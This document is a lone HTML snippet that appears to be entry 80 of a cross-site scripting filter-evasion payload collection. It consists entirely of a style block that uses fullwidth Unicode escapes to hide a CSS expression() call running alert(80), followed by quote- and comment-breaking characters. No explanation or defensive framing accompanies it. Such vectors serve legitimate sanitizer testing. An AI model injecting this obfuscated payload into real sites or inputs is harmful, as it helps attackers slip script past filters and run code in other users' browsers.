<div id="80"><style>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}</style>//["'`--&gt;]]&gt;]</div>
